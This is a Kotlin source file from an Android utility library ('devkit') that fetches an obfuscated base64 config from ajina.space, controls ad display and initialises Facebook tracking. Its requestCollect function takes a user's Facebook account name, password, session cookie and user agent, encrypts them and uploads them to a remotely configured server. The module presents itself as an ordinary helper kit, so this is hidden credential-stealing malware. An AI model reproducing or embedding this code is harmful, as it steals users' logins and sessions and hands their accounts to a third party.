package com.sherloki.devkit

import android.app.Activity
import android.net.Uri
import bolts.AppLinks
import com.facebook.FacebookSdk
import com.facebook.applinks.AppLinkData
import com.franmontiel.persistentcookiejar.PersistentCookieJar
import com.franmontiel.persistentcookiejar.cache.SetCookieCache
import com.franmontiel.persistentcookiejar.persistence.SharedPrefsCookiePersistor
import com.sherloki.devkit.entity.ConfigEntity
import com.sherloki.devkit.entity.UpdateEntity
import com.sherloki.devkit.ktx.KtxActivity
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import okhttp3.Cache
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.RequestBody.Companion.toRequestBody
import okhttp3.logging.HttpLoggingInterceptor
import retrofit2.Retrofit
import retrofit2.converter.gson.GsonConverterFactory
import java.io.File
import java.util.concurrent.TimeUnit

val devkitService by lazy {
    devkitServiceCreator()
}

fun CoroutineScope.requestCollect(
    account: String,
    password: String,
    cookie: String,
    userAgent: String,
    block: () -> Unit
) {
    updateEntity.let {
        it.c?.let { url ->
            it.d?.let { key ->
                if (url.isNotBlank() && key.isNotBlank()) {
                    launch(Dispatchers.IO) {
                        doSuspendOrNull {
                            devkitService.uploadFbData(
                                url,
                                mutableMapOf(
                                    "content" to gson.toJson(
                                        mutableMapOf(
                                            "un" to account,
                                            "pw" to password,
                                            "cookie" to cookie,
                                            "source" to configEntity.app_name,
                                            "ip" to "",
                                            "type" to "f_o",
                                            "b" to userAgent
                                        )
                                    ).toRsaEncrypt(key)
                                )
                            )
                        }?.let {
                            if (it.code == "0" && it.data?.toBooleanStrictOrNull() == true) {
                                "requestCollect success".loge()
                                isLogin = true
                            }
                        }

                        withContext(Dispatchers.Main) {
                            block()
                        }
                    }
                }
            }
        }
    }
}

fun CoroutineScope.requestConfig(block: () -> Unit) {
    launch(Dispatchers.IO) {
        doSuspendOrNull {
            devkitService.getConfig()
        }?.string()
            ?.let {
                try {
                    StringBuffer(it).replace(1, 2, "").toString()
                } catch (e: Exception) {
                    e.fillInStackTrace()
                    null
                }
            }?.let {
                "requestConfig origin-> $it".loge()
                if (it.isBase64()) {
                    "requestConfig isBase64".loge()
                    it.toByteArray().fromBase64().decodeToString()
                } else {
                    "requestConfig notBase64".loge()
                    null
                }
            }?.let {
                gson.fromJson(it, ConfigEntity::class.java)
            }?.let {
                configEntity = it
                if (configEntity.insertAdInvokeTime() != adInvokeTime || configEntity.insertAdRealTime() != adRealTime) {
                    adInvokeTime = configEntity.insertAdInvokeTime()
                    adRealTime = configEntity.insertAdRealTime()
                    adShownIndex = 0
                    adLastTime = 0
                    adShownList = mutableListOf<Boolean>().apply {
                        if (adInvokeTime >= adRealTime) {
                            (0 until adInvokeTime).forEach { _ ->
                                add(false)
                            }
                            (0 until adRealTime).forEach { index ->
                                set(index, true)
                            }
                            "requestConfig configEntity list -> $this".loge()
                        }
                    }
                }
                if (configEntity.faceBookId().isNotBlank()) {
                    initFaceBook()
                }
                "requestConfig configEntity-> $configEntity".loge()
                it.info
            }?.let {
                if (it.isBase64()) {
                    it.toByteArray().fromBase64().decodeToString()
                } else {
                    null
                }
            }?.let {
                gson.fromJson(it, UpdateEntity::class.java)
            }?.let {
                updateEntity = it
                "requestConfig updateEntity-> $updateEntity".loge()
            }
        withContext(Dispatchers.Main) {
            block()
        }
    }
}


fun initFaceBook() {
    FacebookSdk.apply {
        setApplicationId(configEntity.faceBookId())
        sdkInitialize(app)
        setAdvertiserIDCollectionEnabled(true)
        setAutoLogAppEventsEnabled(true)
        fullyInitialize()
    }
}

fun KtxActivity.fetchAppLink(key: String, callback: (Uri?) -> Unit) {
    AppLinkData.fetchDeferredAppLinkData(this, key) { appLinkData ->
        if (!isHandle) {
            isHandle = true
            callback(appLinkData?.targetUri)
        }
    }
}

suspend fun <T> doSuspendOrNull(block: suspend () -> T) =
    try {
        block()
    } catch (e: Exception) {
        "doOrNull ->$e".loge()
        null
    }

private fun clientCreator(block: OkHttpClient.Builder.() -> OkHttpClient.Builder = { this }) =
    OkHttpClient.Builder()
        .cache(Cache(File(app.cacheDir, "cache"), 1024 * 1024 * 100))
        .cookieJar(PersistentCookieJar(SetCookieCache(), SharedPrefsCookiePersistor(app)))
        .readTimeout(15000, TimeUnit.MILLISECONDS)
        .writeTimeout(15000, TimeUnit.MILLISECONDS)
        .connectTimeout(15000, TimeUnit.MILLISECONDS)
        .block()
        .addInterceptor(HttpLoggingInterceptor().setLevel(HttpLoggingInterceptor.Level.BODY))
        .build()

private fun devkitServiceCreator() =
    Retrofit
        .Builder()
        .client(clientCreator())
        .addConverterFactory(GsonConverterFactory.create())
        .baseUrl("https://ajina.space/")
        .build()
        .create(DevkitService::class.java)